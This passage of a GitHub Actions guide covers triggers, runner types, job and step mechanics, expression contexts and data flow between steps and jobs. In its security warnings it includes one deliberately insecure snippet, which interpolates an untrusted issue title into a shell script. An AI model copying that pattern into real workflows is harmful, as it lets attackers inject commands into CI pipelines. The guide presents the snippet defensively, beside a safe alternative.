📌 Cron schedules historically ran only in UTC. **Timezone support was added in 2026**: you can now specify an IANA timezone on cron schedules by adding a `timezone` field alongside the cron expression, so the workflow runs at the local time you specify.

Cron format: `minute hour day-of-month month day-of-week`.

| Expression | Meaning |
|---|---|
| `0 * * * *` | every hour on the hour |
| `*/15 * * * *` | every 15 minutes (minimum interval is 5 minutes) |
| `0 9 * * 1` | 09:00 Mondays |
| `0 0 1 * *` | midnight on the 1st of each month |

⚠️ Three things about scheduled workflows in production:
1. **They are not punctual.** During peak load, runs can be delayed by many minutes. Never rely on cron for anything time-critical.
2. **They run from the default branch only**, using the default branch's version of the file.
3. **GitHub disables scheduled workflows in public repos after 60 days of no repository activity**, and emails the owner. In active private repos this is not an issue.

For anything needing real punctuality or guaranteed delivery, trigger from an external scheduler via `repository_dispatch`.

### 6.6 `workflow_call` — reusable workflows

Turns a workflow into a callable function. Covered fully in Chapter 22.

```yaml
on:
  workflow_call:
    inputs:
      environment: { required: true, type: string }
    secrets:
      registry_token: { required: true }
    outputs:
      image_digest:
        value: ${{ jobs.build.outputs.digest }}
```

### 6.7 `repository_dispatch` — external systems trigger you

```yaml
on:
  repository_dispatch:
    types: [deploy-requested, upstream-released]
```

Triggered by an authenticated `POST`:

```bash
curl -X POST \
  -H "Authorization: Bearer $GH_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/OWNER/REPO/dispatches \
  -d '{"event_type":"deploy-requested","client_payload":{"service":"api","version":"1.4.2"}}'
```

Read the payload with `github.event.client_payload.service`.

Uses: cross-repository orchestration, triggering from Jira/ServiceNow/PagerDuty, triggering from an internal deployment portal, triggering from a non-GitHub CI system during migration.

### 6.8 `workflow_run` — chaining workflows

```yaml
on:
  workflow_run:
    workflows: ["CI"]              # by workflow `name:`, not filename
    types: [completed]
    branches: [main]
```

Runs after another workflow finishes. Crucially, the triggered workflow:
- runs from the **default branch** version of the file
- has **full permissions and secrets**, even if the upstream run was from a fork

That makes it the standard safe pattern for "untrusted build → trusted publish".

Check the outcome, because `completed` fires for failures too:

```yaml
jobs:
  publish:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
```

Downloading artifacts from the upstream run needs the API (artifacts are scoped per run):

```yaml
- uses: actions/download-artifact@v8
  with:
    run-id: ${{ github.event.workflow_run.id }}
    github-token: ${{ secrets.GITHUB_TOKEN }}
    name: build-output
```

### 6.9 The safe fork-PR pattern

```mermaid
sequenceDiagram
    participant F as Fork PR
    participant W1 as ci.yml (pull_request)
    participant AR as Artifact store
    participant W2 as comment.yml (workflow_run)
    participant PR as PR conversation

    F->>W1: opens PR
    Note over W1: read-only token, NO secrets<br/>runs untrusted code safely
    W1->>AR: upload results + PR number as artifact
    W1-->>W2: workflow_run: completed
    Note over W2: runs from default branch<br/>WRITE token, secrets available<br/>does NOT run PR code
    W2->>AR: download artifact
    W2->>PR: post coverage comment
```

### 6.10 `merge_group` — the merge queue

```yaml
on:
  pull_request:
  merge_group:
```

When a merge queue is enabled, GitHub builds a speculative merge of queued PRs and fires `merge_group`. Your CI must handle it or the queue stalls. See Chapter 47.

### 6.11 Issue, comment and label events — repo automation

```yaml
on:
  issues:
    types: [opened, labeled, reopened]
  issue_comment:
    types: [created]
```

⚠️ `issue_comment` fires for comments on **both** issues and pull requests. Distinguish them:

```yaml
if: ${{ github.event.issue.pull_request }}     # truthy only for PR comments
```

This is the foundation of ChatOps (`/deploy staging` in a PR comment) — see §38.4.

### 6.12 `deployment` / `deployment_status`

Lets you decouple "someone requested a deployment" from "something performs it". Useful when a portal or ArgoCD creates GitHub Deployments and you react to them.

### 6.13 Events summary table

| Event | Runs workflow from | Secrets available | Token | Typical use |
|---|---|---|---|---|
| `push` | triggering SHA | yes | write | CI, deploy on main, release on tag |
| `pull_request` | base branch (merge ref) | no, for forks | read for forks | PR quality gates |
| `pull_request_target` | base branch | **yes** | **write** | labelling, commenting. ⚠️ never run PR code |
| `workflow_dispatch` | selected ref | yes | write | manual ops, runbooks |
| `schedule` | default branch | yes | write | nightlies, cleanup, drift detection |
| `workflow_run` | default branch | yes | write | trusted post-processing of untrusted builds |
| `repository_dispatch` | default branch | yes | write | external triggers |
| `workflow_call` | caller's context | passed/inherited | caller's | shared pipelines |
| `merge_group` | queue merge ref | yes | write | merge queue validation |
| `release` | tag ref | yes | write | publish on release |
| `issue_comment` | default branch | yes | write | ChatOps |

### 6.14 Skipping runs

Add `[skip ci]` or `[ci skip]` (also `[skip actions]`, `[actions skip]`, `***NO_CI***`) to a commit message to skip `push` and `pull_request` triggered workflows entirely. Useful for automated commits like version bumps — but ⚠️ it skips *required checks* too, so a skipped commit can block a merge.

---

## Chapter 7 — Runners

### 7.1 The two families

```mermaid
flowchart TD
    R["Runners"] --> H["GitHub-hosted"]
    R --> S["Self-hosted"]
    H --> H1["Standard<br/>ubuntu-latest, windows-latest, macos-latest"]
    H --> H2["Larger runners<br/>4/8/16/32/64 vCPU, more RAM"]
    H --> H3["ARM64 runners<br/>ubuntu-24.04-arm, ubuntu-26.04-arm"]
    H --> H4["Custom images<br/>your own base image, GitHub-managed VMs"]
    S --> S1["Individual machines<br/>register a runner on a VM"]
    S --> S2["Actions Runner Controller (ARC)<br/>autoscaling on Kubernetes"]
    S --> S3["Runner scale set client<br/>custom autoscaling, any infra"]
    S --> S4["Third-party hosted<br/>Namespace, BuildJet, Blacksmith, WarpBuild"]
```

### 7.2 GitHub-hosted runner images

The Ubuntu 26.04 runner image is fully supported for production workflows on both x64 and arm64, and the `ubuntu-latest` label has migrated to Ubuntu 26.04.

| Label | OS | Typical spec (public repos / free tier) |
|---|---|---|
| `ubuntu-latest` → `ubuntu-26.04` | Ubuntu 26.04 LTS | 4 vCPU, 16 GB RAM, 14 GB SSD |
| `ubuntu-24.04` | Ubuntu 24.04 LTS | same |
| `ubuntu-22.04` | Ubuntu 22.04 LTS | ⚠️ deprecation began 2026-09-17 |
| `ubuntu-24.04-arm`, `ubuntu-26.04-arm` | ARM64 Ubuntu | ARM64; cheaper per minute |
| `ubuntu-slim` | Minimal Ubuntu | Faster boot, far fewer preinstalled tools |
| `windows-latest` | Windows Server | 4 vCPU, 16 GB |
| `macos-latest` | macOS on Apple Silicon | 3-4 vCPU. 💰 10× Linux minute cost |

⚠️ **Never rely on `-latest` for reproducibility in production.** The `-latest` migration is gradual and happens over 1-2 months, so any workflow using the `-latest` label may see the OS version change; to avoid unwanted migration, specify a pinned OS version such as `ubuntu-24.04`.

For production pipelines: pin the OS (`runs-on: ubuntu-24.04`) and schedule a deliberate upgrade. For throwaway automation, `-latest` is fine.

**What is preinstalled.** The Ubuntu image ships with JDKs (Temurin 17/21/25), Node, Python, Go, Docker + Buildx, AWS/Azure/GCloud CLIs, Terraform, kubectl, Helm, and hundreds more. The authoritative list is in `actions/runner-images` per release. Anything preinstalled costs you zero setup time — prefer it over installing your own.

### 7.3 Choosing `runs-on`

```yaml
runs-on: ubuntu-24.04                          # single label
runs-on: [self-hosted, linux, x64, gpu]        # ALL labels must match
runs-on:
  group: production-runners                    # a runner group
  labels: [self-hosted, linux]                 # optionally narrowed
runs-on: ${{ matrix.os }}                      # from a matrix
runs-on: ${{ inputs.runner || 'ubuntu-24.04' }}  # from an input with fallback
```

When given an array, the job goes to a runner that has **every** label.

### 7.4 Larger runners

Configured at org/enterprise level with a custom label, then:

```yaml
runs-on: ubuntu-latest-16-cores
```

💰 Larger runners bill at a higher per-minute rate, roughly proportional to vCPU. They are worth it when:
- Your build genuinely parallelises (Maven `-T`, Gradle workers, Go test `-p`, Jest workers)
- You are disk-bound and need more than 14 GB
- Wall-clock time of the PR gate is hurting developer throughput

They are **not** worth it for a job that spends 90% of its time on network I/O.

Do the arithmetic: a 4× runner that halves your build time costs 2× more. Only worth it if engineer waiting time is the constraint — which, on a PR gate, it usually is.

### 7.5 ARM64 runners

`ubuntu-24.04-arm` / `ubuntu-26.04-arm`. Cheaper per minute and often faster for compile-heavy work. Two caveats:
- Any native dependency must have an ARM64 build.
- If you build container images on ARM and deploy to x86 (or vice versa) you need multi-arch builds (§30.5).

For Java and Go this is usually a free win; both have excellent ARM support.

### 7.6 Custom images for GitHub-hosted runners

📌 Custom images for GitHub-hosted runners became generally available in March 2026. You supply a base image; GitHub runs it on managed VMs. This gives you the speed of pre-baked tooling (no `apt-get install` on every job) without operating a runner fleet. Excellent middle ground when your builds need heavy, slow-to-install dependencies.

### 7.7 Self-hosted runners

Register a machine to a repo, org, or enterprise. The runner polls GitHub over outbound HTTPS — no inbound ports.

```bash
# on your machine
mkdir actions-runner && cd actions-runner
curl -o actions-runner-linux-x64.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.xxx.x/actions-runner-linux-x64-2.xxx.x.tar.gz
tar xzf actions-runner-linux-x64.tar.gz
./config.sh --url https://github.com/ORG/REPO --token <REG_TOKEN> \
            --labels linux,x64,self-hosted,build \
            --ephemeral
sudo ./svc.sh install && sudo ./svc.sh start
```

**When you need them:**
- Access to private networks (a database, an internal registry, a VPC)
- Specialised hardware (GPU, ARM, macOS on your own silicon, large disk)
- 💰 Cost at high volume
- Compliance requiring builds inside your own perimeter

⚠️⚠️ **Never attach a self-hosted runner to a public repository.** Anyone can open a PR whose workflow executes arbitrary code on your machine, inside your network. GitHub warns about this explicitly. For public repos, use hosted runners.

**Always use `--ephemeral`.** A persistent runner accumulates state between jobs: leftover Docker images, `~/.m2` contents, environment mutations. Worse, one job can poison another's dependencies. Ephemeral runners register, run exactly one job, then deregister.

📌 The runner agent has enforced minimum versions and a deprecation schedule. A REST API returns when registration and runtime support end for a given runner version — `GET /actions/runners/deprecations/{version}` at repository, organization, or enterprise level, returning `runner_version`, `runtime_deprecates_at` and `registration_deprecates_at`. Wire this into a scheduled workflow so runner upgrades never surprise you.

### 7.8 Actions Runner Controller (ARC)

The production way to run self-hosted runners: a Kubernetes operator that creates ephemeral runner pods on demand and scales to zero.

```mermaid
sequenceDiagram
    participant GH as GitHub Actions
    participant L as ARC listener pod
    participant C as ARC controller
    participant K as Kubernetes API
    participant P as Runner pod

    L->>GH: long-poll scale set for pending jobs
    GH-->>L: 3 jobs queued for label "k8s-runner"
    L->>C: desired replicas = 3
    C->>K: create 3 ephemeral runner pods
    K->>P: schedule pods
    P->>GH: register as ephemeral runner
    GH->>P: assign job
    P->>P: execute steps
    P->>GH: report result, deregister
    P->>K: pod terminates
    C->>K: scale back toward zero
```

Install with Helm:

```bash
helm install arc \
  --namespace arc-systems --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

helm install my-runners \
  --namespace arc-runners --create-namespace \
  --set githubConfigUrl="https://github.com/my-org" \
  --set githubConfigSecret.github_app_id="123456" \
  --set githubConfigSecret.github_app_installation_id="7890" \
  --set githubConfigSecret.github_app_private_key="$(cat key.pem)" \
  --set maxRunners=50 --set minRunners=0 \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
```

Then `runs-on: my-runners` (the scale set name becomes the label).

Key design decisions with ARC:
- **`containerMode: kubernetes`** (each step's container is a k8s pod, needs a ReadWriteMany volume) vs **`containerMode: dind`** (Docker-in-Docker sidecar, simpler, needs privileged).
- **Authenticate with a GitHub App**, not a PAT. PATs expire and are tied to a person.
- **Give runner pods a service account with an IRSA/Workload Identity binding** so they need no cloud credentials.
- **Pre-warm** with `minRunners: 2` if queue latency matters.

📌 A GitHub Actions runner scale set client is also available as a standalone Go module, letting you build custom autoscaling without Kubernetes — integrating directly with GitHub's scale set APIs across containers, VMs, or bare metal on Windows, Linux and macOS.

### 7.9 Third-party hosted runners

Vendors like Namespace, BuildJet, Blacksmith and WarpBuild provide drop-in replacement runners: change one line of `runs-on:` and get faster machines, better caching, and remote Docker builders, typically at lower cost than GitHub's larger runners. Worth evaluating once your monthly Actions bill is material.

### 7.10 Choosing — a decision table

| Situation | Choose |
|---|---|
| Public repo, anything | GitHub-hosted. Never self-hosted |
| Standard backend CI, moderate volume | `ubuntu-24.04` hosted |
| Need private network / internal DB | Self-hosted or ARC in the VPC |
| Build is CPU-bound, PR latency hurts | Larger runner or ARM, measure both |
| Very high volume, cost is a problem | ARC on your own k8s, or a third-party vendor |
| Needs GPU / mac hardware | Self-hosted, or hosted macOS if Apple-specific |
| Compliance: builds must stay in perimeter | ARC in your cluster, with egress restrictions |

---

## Chapter 8 — Jobs, Steps, Shells and the Runner Filesystem

### 8.1 Job anatomy

```yaml
jobs:
  build:                              # job_id — must be unique, alphanumeric/-/_
    name: Build and test              # display name, supports expressions
    runs-on: ubuntu-24.04
    timeout-minutes: 20               # ALWAYS set this
    steps:
      - ...
```

⚠️ **Always set `timeout-minutes`.** The default is **360 minutes (6 hours)**. A hung job — a test waiting on a port that never opens — will burn six hours of billed minutes and hold a concurrency slot. Set it to roughly 2–3× your p95 duration.

### 8.2 Step anatomy: `run` vs `uses`

A step is **either** `run:` **or** `uses:`. Never both.

```yaml
steps:
  # uses: invoke an action
  - name: Checkout
    uses: actions/checkout@v7
    with:
      fetch-depth: 0

  # run: execute a shell command
  - name: Build
    id: build
    run: |
      set -euo pipefail
      mvn -B -ntp clean verify
    env:
      MAVEN_OPTS: -Xmx3g
    working-directory: ./service
    timeout-minutes: 15
    continue-on-error: false
```

The four forms of `uses:`:

```yaml
uses: actions/checkout@v7                       # public repo action, tag
uses: actions/checkout@a1b2c3d4...              # public repo action, SHA (production!)
uses: ./.github/actions/setup-build             # local action in this repo
uses: docker://alpine:3.20                      # a Docker image directly
uses: my-org/shared-actions/build@v2            # action in a subdirectory
```

### 8.3 Shells

| `shell:` value | Runs as | Notes |
|---|---|---|
| (default, Linux/macOS) | `bash -e {0}` | ⚠️ no `pipefail` |
| `bash` | `bash --noprofile --norc -eo pipefail {0}` | **Use this.** Sane defaults |
| `sh` | `sh -e {0}` | POSIX, for minimal containers |
| (default, Windows) | `pwsh -command ". '{0}'"` | |
| `pwsh` / `powershell` | PowerShell Core / Windows PowerShell | |
| `cmd` | `%ComSpec% /D /E:ON /V:OFF /S /C "CALL "{0}""` | |
| `python` | `python {0}` | Write Python directly in a step |
| custom | e.g. `shell: perl {0}` | Any interpreter |

```yaml
- name: Compute something in Python
  shell: python
  run: |
    import json, os
    result = {"count": 42}
    with open(os.environ["GITHUB_OUTPUT"], "a") as f:
        f.write(f"payload={json.dumps(result)}\n")
```

🧠 **Write `set -euo pipefail` at the top of any non-trivial script anyway**, even with `shell: bash`. Explicit is better, and it survives being copied into a container job.

### 8.4 Each step is a new process

```yaml
- run: export MY_VAR=hello
- run: echo "$MY_VAR"        # prints nothing — different process
```

To persist across steps, append to `$GITHUB_ENV`:

```yaml
- run: echo "MY_VAR=hello" >> "$GITHUB_ENV"
- run: echo "$MY_VAR"        # prints hello
```

Full data-flow mechanics in Chapter 10.

### 8.5 `continue-on-error`

```yaml
- name: Optional linter
  id: lint
  continue-on-error: true
  run: ./run-experimental-lint.sh

- name: Report
  if: steps.lint.outcome == 'failure'
  run: echo "Experimental lint failed but we continued"
```

Note the distinction:
- `steps.<id>.outcome` — the result **before** `continue-on-error` is applied
- `steps.<id>.conclusion` — the result **after** it is applied

At job level, `continue-on-error: true` means downstream `needs:` jobs still run. Combined with a matrix, it lets you mark specific combinations as allowed-to-fail:

```yaml
strategy:
  fail-fast: false
  matrix:
    java: ['17', '21']
    include:
      - java: '25-ea'
        experimental: true
continue-on-error: ${{ matrix.experimental || false }}
```

### 8.6 Job status and step ordering

Steps run in order. If a step fails, remaining steps are **skipped** unless they have an `if:` that says otherwise:

```yaml
- run: mvn verify

- name: Always upload test reports
  if: always()                       # runs even if the build failed
  uses: actions/upload-artifact@v7
  with:
    name: surefire-reports
    path: '**/target/surefire-reports/'

- name: Only on failure
  if: failure()
  run: ./scripts/dump-diagnostics.sh

- name: Only if nothing was cancelled
  if: '!cancelled()'
  run: ./scripts/cleanup.sh
```

🧠 `always()` also runs when the job is **cancelled**. If you want "run on success or failure but not cancellation", use `if: !cancelled()`.

### 8.7 The working directory

Every `run:` step starts in `$GITHUB_WORKSPACE`. Change it per step or per job:

```yaml
defaults:
  run:
    working-directory: ./services/api
```

⚠️ `working-directory` applies only to `run:` steps, **not** to `uses:` steps. An action that needs a path takes it as an input.

### 8.8 Job outputs and the job graph in practice

```yaml
jobs:
  prepare:
    runs-on: ubuntu-24.04
    outputs:
      version: ${{ steps.meta.outputs.version }}
      should_deploy: ${{ steps.meta.outputs.should_deploy }}
    steps:
      - uses: actions/checkout@v7
      - id: meta
        run: |
          VERSION="$(git describe --tags --always)"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "should_deploy=true" >> "$GITHUB_OUTPUT"

  deploy:
    needs: prepare
    if: needs.prepare.outputs.should_deploy == 'true'
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Deploying ${{ needs.prepare.outputs.version }}"
```

⚠️ Job outputs are **strings**. `'true'` not `true`. And ⚠️ **job outputs are not masked** — never put a secret in one.

---
## Chapter 9 — Contexts, Expressions and Functions

### 9.1 What an expression is

Anything inside `${{ }}` is evaluated by the Actions expression engine before the value is used.

```yaml
if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}
run: echo "${{ github.sha }}"
```

In `if:` the wrapper is optional — `if: github.ref == 'refs/heads/main'` works. Everywhere else it is required.

### 9.2 Contexts

A context is an object of data made available to your workflow.

| Context | Contains | Example |
|---|---|---|
| `github` | Event payload, repo, ref, actor, run metadata | `github.sha`, `github.event.pull_request.number` |
| `env` | Variables defined via `env:` or `$GITHUB_ENV` | `env.BUILD_DIR` |
| `vars` | Configuration variables (repo/org/env level) | `vars.AWS_REGION` |
| `secrets` | Secrets (repo/org/env level) | `secrets.REGISTRY_TOKEN` |
| `job` | Current job status and service container info | `job.status`, `job.services.postgres.ports['5432']` |
| `jobs` | (Reusable workflows only) outputs of jobs, for `workflow_call` outputs | `jobs.build.outputs.digest` |
| `steps` | Outputs and outcomes of previous steps in this job | `steps.build.outputs.version` |
| `runner` | Runner info | `runner.os`, `runner.arch`, `runner.temp` |
| `strategy` | Matrix execution info | `strategy.job-index`, `strategy.job-total` |
| `matrix` | Current matrix combination | `matrix.java`, `matrix.os` |
| `needs` | Outputs and results of jobs this one depends on | `needs.build.outputs.image`, `needs.build.result` |
| `inputs` | Inputs to `workflow_dispatch` or `workflow_call` | `inputs.environment` |

### 9.3 The `github` context — the parts you actually use

| Property | Value | Note |
|---|---|---|
| `github.sha` | Commit SHA that triggered the run | For `pull_request` this is the **merge commit**, not the PR head |
| `github.ref` | `refs/heads/main`, `refs/pull/42/merge`, `refs/tags/v1.0.0` | Full ref |
| `github.ref_name` | `main`, `42/merge`, `v1.0.0` | Short form |
| `github.ref_type` | `branch` or `tag` | |
| `github.head_ref` | Source branch of a PR | Empty outside PR events |
| `github.base_ref` | Target branch of a PR | Empty outside PR events |
| `github.repository` | `owner/repo` | |
| `github.repository_owner` | `owner` | |
| `github.actor` | Login that triggered the run | |
| `github.triggering_actor` | Login that re-ran it, if different | Use this for audit |
| `github.event_name` | `push`, `pull_request`, ... | |
| `github.event` | **The entire webhook payload** | Anything the webhook sends |
| `github.workflow` | Workflow `name:` | |
| `github.run_id` | Unique run ID | Use in artifact/cache keys and URLs |
| `github.run_number` | Incrementing per workflow | Human-friendly build number |
| `github.run_attempt` | 1, 2, 3... on re-runs | Useful for retry logic |
| `github.workspace` | Absolute path to workspace | |
| `github.token` | The `GITHUB_TOKEN` | Same as `secrets.GITHUB_TOKEN` |
| `github.server_url` / `api_url` | `https://github.com` / `https://api.github.com` | Use these so workflows work on GHES |
| `github.workflow_ref` | `owner/repo/.github/workflows/ci.yml@refs/heads/main` | Used in OIDC subject claims |

📌 **New in 2026 (not on GHES):** the `job` context gained `job.workflow_ref`, `job.workflow_sha`, `job.workflow_repository` and `job.workflow_file_path`. Unlike `github.workflow_ref`, these describe **the workflow file that defines the current job**, so inside a reusable workflow they point at the reusable workflow itself rather than the caller. Very useful for provenance and for a reusable workflow that needs to know its own version.

🧠 **Exploring the payload.** When you do not know what is in `github.event`, dump it:

```yaml
- name: Dump event payload
  run: echo "$PAYLOAD"
  env:
    PAYLOAD: ${{ toJSON(github.event) }}
```

⚠️ Note the `env:` indirection — never interpolate untrusted payload data directly into a `run:` script (§48.3).

### 9.4 Operators

| Category | Operators |
|---|---|
| Grouping | `( )` |
| Index | `[ ]`, `.` |
| Logical NOT | `!` |
| Comparison | `<`, `<=`, `>`, `>=`, `==`, `!=` |
| Logical | `&&`, `\|\|` |

Comparison is **loose**: `'1' == 1` is true, and strings are compared case-insensitively. `github.ref == 'REFS/HEADS/MAIN'` is true when the ref is `refs/heads/main`. Do not rely on this; be consistent.

`&&` and `||` are also used for defaults, like JavaScript:

```yaml
runs-on: ${{ inputs.runner || 'ubuntu-24.04' }}
timeout-minutes: ${{ github.event_name == 'schedule' && 60 || 20 }}
```

### 9.5 Which contexts are available where

This is the source of endless confusion. The engine evaluates different parts of the file at different times.

```mermaid
flowchart TD
    A["Event arrives"] --> B["Parse workflow<br/>Available: github, inputs, vars"]
    B --> C["Evaluate job-level if, needs, strategy<br/>Available: + needs, secrets*, vars"]
    C --> D["Job assigned to runner<br/>Available: + runner, env, job, matrix, secrets"]
    D --> E["Step executes<br/>Available: + steps, everything"]
```

| Location | `github` | `needs` | `env` | `secrets` | `matrix` | `steps` | `runner` | `job` |
|---|---|---|---|---|---|---|---|---|
| `on:` filters | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| `run-name` | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| top-level `env` | ✅ | ❌ | ❌ | ✅ | ❌ | ❌ | ❌ | ❌ |
| `jobs.<id>.if` | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| `jobs.<id>.runs-on` | ✅ | ✅ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| `jobs.<id>.strategy` | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| `jobs.<id>.env` | ✅ | ✅ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| `steps.<n>.if` | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ | ✅ |
| `steps.<n>.with` / `run` | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

⚠️ The two that catch everyone:
1. **`env` is not available in job-level `if:`.** This fails silently (evaluates to empty):
   ```yaml
   env:
     DEPLOY: "true"
   jobs:
     d:
       if: env.DEPLOY == 'true'     # ❌ never true
   ```
   Use `vars.DEPLOY` (repository variables *are* available) or move the condition to a step.

2. **`secrets` is not available in step-level `if:`.** To branch on whether a secret exists, promote it to an output or an env var first:
   ```yaml
   - id: check
     run: |
       if [ -n "${SLACK_WEBHOOK}" ]; then echo "has=true" >> "$GITHUB_OUTPUT"; fi
     env:
       SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
   - if: steps.check.outputs.has == 'true'
     run: ./notify.sh
   ```

### 9.6 Built-in functions

**String functions**

| Function | Behaviour |
|---|---|
| `contains(haystack, needle)` | Works on strings and arrays |
| `startsWith(s, prefix)` / `endsWith(s, suffix)` | |
| `format('{0} and {1}', a, b)` | Escape a literal brace as `{{` |
| `join(array, separator)` | Separator defaults to `,` |
| `toJSON(value)` | Pretty-printed JSON — the debugging workhorse |
| `fromJSON(string)` | Parse JSON. Essential for dynamic matrices and for turning strings into real booleans/numbers |
| `hashFiles('**/pom.xml')` | SHA-256 of the matched files. The basis of every cache key |

**Status check functions** (valid only in `if:`)

| Function | True when |
|---|---|
| `success()` | All previous steps/needs succeeded. **This is the implicit default** |
| `failure()` | Any previous step failed |
| `cancelled()` | The workflow run was cancelled |
| `always()` | Always — including on cancellation |

🧠 `fromJSON` is more useful than it looks:

```yaml
# Turn a string into a real boolean
if: fromJSON(inputs.dry_run) == false

# Turn a string into a real number for timeout-minutes
timeout-minutes: ${{ fromJSON(inputs.timeout) }}

# Build a matrix from an upstream job
strategy:
  matrix:
    service: ${{ fromJSON(needs.detect.outputs.services) }}
```

### 9.7 Practical expression patterns

```yaml
# Only on the default branch of the main repo (not a fork)
if: github.ref == format('refs/heads/{0}', github.event.repository.default_branch)
    && github.repository == 'my-org/my-repo'

# Only on version tags
if: startsWith(github.ref, 'refs/tags/v')

# Skip for Dependabot
if: github.actor != 'dependabot[bot]'

# Skip draft PRs
if: github.event.pull_request.draft == false

# Only if a specific label is present
if: contains(github.event.pull_request.labels.*.name, 'deploy-preview')

# Only for internal PRs (not from forks)
if: github.event.pull_request.head.repo.full_name == github.repository

# Run on failure, but not on cancellation
if: failure() && !cancelled()

# Only on the first attempt
if: github.run_attempt == 1

# Combine needs results
if: needs.test.result == 'success' && needs.scan.result != 'failure'
```

🧠 `labels.*.name` is **object filter syntax**: `*` maps over an array and collects the named property. `contains(github.event.commits.*.message, 'hotfix')` works the same way.

---

## Chapter 10 — Variables, Inputs, Outputs and Data Flow

This chapter is the one that turns a beginner into someone who can build real pipelines. Data flow is *the* hard part of Actions.

### 10.1 The complete data-flow map

```mermaid
flowchart TD
    subgraph WITHIN["Within one job (same machine)"]
        S1["Step 1"] -->|"$GITHUB_OUTPUT<br/>steps.id.outputs.x"| S2["Step 2"]
        S1 -->|"$GITHUB_ENV<br/>env.X"| S2
        S1 -->|"$GITHUB_PATH"| S2
        S1 -->|"files on disk"| S2
    end
    subgraph ACROSS["Across jobs (different machines)"]
        J1["Job A"] -->|"jobs.A.outputs<br/>needs.A.outputs.x  (strings)"| J2["Job B"]
        J1 -->|"upload-artifact →<br/>download-artifact  (files)"| J2
        J1 -->|"cache save → cache restore<br/>(best-effort files)"| J2
        J1 -->|"push image to registry<br/>(the real production answer)"| J2
    end
    subgraph ACROSSRUN["Across workflow runs"]
        W1["Run 1"] -->|"artifacts via API + run-id"| W2["Run 2"]
        W1 -->|"cache (shared by key)"| W2
        W1 -->|"registry / external store"| W2
        W1 -->|"repository variables via API"| W2
    end
```

### 10.2 Environment variables: the three scopes

```yaml
env:
  GLOBAL_VAR: available-everywhere        # workflow scope

jobs:
  build:
    env:
      JOB_VAR: available-in-this-job      # job scope
    steps:
      - run: echo "$STEP_VAR"
        env:
          STEP_VAR: available-in-this-step  # step scope
```

More specific wins. Access with `$VAR` in shell or `${{ env.VAR }}` in expressions.

🧠 **Prefer `env:` over `${{ }}` inside `run:`**. Two reasons: it avoids script injection, and it keeps multi-line scripts readable.

```yaml
# ⚠️ risky and ugly
- run: ./deploy.sh "${{ github.event.issue.title }}" "${{ needs.build.outputs.tag }}"

# ✅ safe and readable
- run: ./deploy.sh "$ISSUE_TITLE" "$IMAGE_TAG"
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
    IMAGE_TAG: ${{ needs.build.outputs.tag }}
```

### 10.3 The environment files

The runner watches four special files. Appending to them is how a step talks to the engine.

| File | Purpose | Read back as |
|---|---|---|
| `$GITHUB_OUTPUT` | Set a step output | `steps.<id>.outputs.<name>` |
| `$GITHUB_ENV` | Set an env var for later steps | `$NAME` / `env.NAME` |
| `$GITHUB_PATH` | Prepend a directory to `PATH` | available in later steps |
| `$GITHUB_STEP_SUMMARY` | Write Markdown shown in the run UI | rendered on the job page |

```yaml
- id: meta
  run: |
    echo "version=1.4.2"        >> "$GITHUB_OUTPUT"
    echo "BUILD_DIR=./target"   >> "$GITHUB_ENV"
    echo "$HOME/.local/bin"     >> "$GITHUB_PATH"

- run: |
    echo "version is ${{ steps.meta.outputs.version }}"
    ls "$BUILD_DIR"
```

**Multiline values** need heredoc delimiter syntax:

```yaml
- id: changelog
  run: |
    {
      echo 'body<<CHANGELOG_EOF'
      git log --pretty=format:'- %s' "$LAST_TAG..HEAD"
      echo
      echo 'CHANGELOG_EOF'
    } >> "$GITHUB_OUTPUT"
```

⚠️ The delimiter must be unique and must not appear in the content. Using a random delimiter is the hardened form:

```yaml
- run: |
    EOF_MARK="$(openssl rand -hex 16)"
    {
      echo "body<<$EOF_MARK"
      cat notes.md
      echo "$EOF_MARK"
    } >> "$GITHUB_OUTPUT"
```

This matters for security: if an attacker can control content that lands in `$GITHUB_OUTPUT`, a predictable delimiter lets them inject arbitrary outputs and env vars.

⚠️ The old `::set-output name=x::y` and `::set-env` commands are **disabled** — they were the vector for exactly that injection. Use the files.

### 10.4 Job summaries — the underused feature

`$GITHUB_STEP_SUMMARY` accepts GitHub-flavoured Markdown and renders it on the run page. Use it instead of making people read logs.

```yaml
- name: Publish test summary
  if: always()
  run: |
    {
      echo "## Test results"
      echo ""
      echo "| Suite | Tests | Failures | Time |"
      echo "|---|---:|---:|---:|"
      python3 scripts/surefire_to_md.py target/surefire-reports
      echo ""
      echo "### Coverage"
      echo "Line coverage: **${COVERAGE}%**"
      echo ""
      echo "<details><summary>Slowest 10 tests</summary>"
      echo ""
      echo '```'
      head -10 slow-tests.txt
      echo '```'
      echo ""
      echo "</details>"
    } >> "$GITHUB_STEP_SUMMARY"
```

Summaries support tables, images, collapsible sections, and **Mermaid diagrams**. Limit is 1 MiB per step.

### 10.5 Repository, environment and organisation variables (`vars`)

Non-secret configuration, set in Settings → Secrets and variables → Actions → Variables.

```yaml
- run: aws s3 sync ./dist "s3://${{ vars.ARTIFACT_BUCKET }}/"
  env:
    AWS_REGION: ${{ vars.AWS_REGION }}
```

Precedence: **environment > repository > organisation**. Environment-scoped variables are the clean way to do per-environment config:

| Variable | `staging` | `production` |
|---|---|---|
| `CLUSTER_NAME` | `eks-staging` | `eks-prod` |
| `REPLICAS` | `1` | `6` |
| `LOG_LEVEL` | `DEBUG` | `INFO` |

Then a single deploy job parameterised only by `environment:`.

